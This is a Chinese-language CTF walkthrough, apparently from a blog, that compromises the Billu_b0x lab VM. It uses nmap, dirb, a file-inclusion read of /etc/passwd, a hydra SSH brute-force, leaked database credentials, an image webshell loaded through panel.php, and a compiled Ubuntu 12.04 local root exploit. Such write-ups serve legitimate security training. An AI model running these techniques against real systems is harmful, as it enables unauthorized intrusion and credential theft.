---
title: CTF综合靶机（Billu_b0x）渗透测试
date: 2019-03-03 22:28:28
categories: WEB安全
tags: 靶机实验

---
<blockquote class="blockquote-center">很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。</blockquote>

<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=5272610&auto=1&height=66"></iframe></div>

下载地址：

链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg 
提取码：kger 
复制这段内容后打开百度网盘手机App，操作更方便哦

使用VMware打开虚拟机，设置网络为仅主机模式即可

### 发现目标：

使用nmap的-sP参数去探测在当前局域网内存活的主机

```
root@kali:~# nmap -sP 192.168.149.0/24

Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 16:49 CST

Nmap scan report for 192.168.149.1

Host is up (0.00036s latency).

MAC Address: 00:50:56:C0:00:01 (VMware)   

Nmap scan report for 192.168.149.132   //靶机地址

Host is up (0.00019s latency).

MAC Address: 00:0C:29:E8:DA:C7 (VMware)

Nmap scan report for 192.168.149.254  //网关地址

Host is up (0.00091s latency).

MAC Address: 00:50:56:F5:FB:82 (VMware)

Nmap scan report for 192.168.149.131   //kali主机地址

Host is up.

Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds
```

使用nmap的-sV扫描目标系统开放的服务，-p-表示对目标系统全部端口进行扫描，--script=banner表示使用nmap中的脚本去扫描目标系统的服务版本信息

```
root@kali:~# nmap -sV -p-  --script=banner  192.168.149.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 17:20 CST
Nmap scan report for 192.168.149.132
Host is up (0.0012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 00:0C:29:E8:DA:C7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
```

发现目标系统只开放了22端口和80端口，那么先从80端口尝试一番

### 探测SQL注入漏洞：

通过浏览器访问目标系统的80端口，出现下面的页面，需要展示SQL注入技巧，尝试了几个SQL万能密码都没办法成功，那么可以用sqlmap跑一跑，可能能跑出结果

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0pqvya0xaj318h0kuhaa.jpg)

因为使用burpsuite抓包的值是post类型的数据包，所以我们设置的sqlmap命令为：

```
sqlmap.py -u "http://192.168.149.132/" --data="un=admin&ps=123456&login=let%27s+login" --dbms="mysql" --level=3 --batch
```

但是跑了好久也没有跑出来，只能换一种方法

### 目录爆破：

试试目录爆破获取可以获取到有用的信息

我平时在Windows下使用的是御剑，kali 中用得是dirb和dirbuster

```
root@kali:~# dirb http://192.168.149.132

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar  3 18:03:34 2019
URL_BASE: http://192.168.149.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.149.132/ ----
+ http://192.168.149.132/add (CODE:200|SIZE:307)                                                         
+ http://192.168.149.132/c (CODE:200|SIZE:1)                                                             
+ http://192.168.149.132/cgi-bin/ (CODE:403|SIZE:291)                                                    
+ http://192.168.149.132/head (CODE:200|SIZE:2793)                                                       
==> DIRECTORY: http://192.168.149.132/images/                                                            
+ http://192.168.149.132/in (CODE:200|SIZE:47559)                                                        
+ http://192.168.149.132/index (CODE:200|SIZE:3267)                                                      
+ http://192.168.149.132/index.php (CODE:200|SIZE:3267)                                                  
+ http://192.168.149.132/panel (CODE:302|SIZE:2469)                                                      
+ http://192.168.149.132/server-status (CODE:403|SIZE:296)                                               
+ http://192.168.149.132/show (CODE:200|SIZE:1)                                                          
+ http://192.168.149.132/test (CODE:200|SIZE:72)                                                         
                                                                                                         
---- Entering directory: http://192.168.149.132/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Mar  3 18:03:38 2019
DOWNLOADED: 4612 - FOUND: 11
```

当访问到test文件时，系统提示：

```
'file' parameter is empty. Please provide file path in 'file' parameter 
```

### 文件包含：

那么可以得出test文件内有一个文件包含函数，那么这里很有可能有个文件包含漏洞

原先构造URL为：

```
http://192.168.149.132/test?file=/etc/passwd
```

发现没有反应，那么可能需要构造post类型数据包

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0prz1d94sj30mz0jfjs5.jpg)

由passwd我们可以得出当时可以登录的账号为root和ica用户

我们可以使用hydra进行爆破试试

```
hydra -l root -P /root/dict/1433-pass.txt -T 6 192.168.149.132 ssh
```

当然hydra是可以爆破成功的，只要字典强大，爆出root密码为roottoor。这个等会用。



我们将刚刚爆破出来的文件一一下载看看里面有没有其他有用的内容

当在查看c.php文件时，发现其存在mysql数据库的账号和密码和数据库名。我们即可以通过数据库连接软件去连接

```
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```



获得网站账号biLLu，密码hEx_it，然后成功登陆

在网站发现可以添加用户，并能上传图片，发现只能上传图片文件的后缀才可以，显然网站设置了白名单。

### 获取shell：

我们之前查看test文件包含的时候，下载了panel.php文件，这个文件也存在文件包含的功能

```
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}
```

那我们上传一个图片马上去，然后使用panel.php包含这个文件，成功获取到

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0pxx2h437j30vp0fidhb.jpg)



刚刚在网上找这类靶机的文章，发现一位大佬爆破出phpmy目录，然后通过猜解路径去下载，这个文件默认路径在/var/www/phpmy下面，那么我们还可以通过文件包含下载这个文件，然后获取到root账号和密码

```
<?php

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';  //root密码
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';


?>
```

### Ubuntu本地提权：

那么使用xshell去远程连接目标服务器，

```
root@indishell:~# uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

root@indishell:~# cat /etc/issue
Ubuntu 12.04.5 LTS \n \l
```

看到是Ubuntu12.04版本的，那么可以利用Ubuntu著名的本地提权exp

下载地址：<https://www.exploit-db.com/exploits/37292>

将EXP代码保存带文件内，然后赋予权限，进行编译

```
root@indishell:~# vim exp.c
root@indishell:~# chmod 777 exp.c  //赋予权限
root@indishell:~# gcc exp.c -o exp	//编译
root@indishell:~# ls	
exp  exp.c
root@indishell:~# mv exp /home/ica/  
root@indishell:~# su - ica   //由于是复现，我们切换用户为ica进行本地越权
ica@indishell:~$
ica@indishell:~$ ls
exp
ica@indishell:~$ ./exp  //执行EXP
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root)  groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)       //成功越权
# 

```

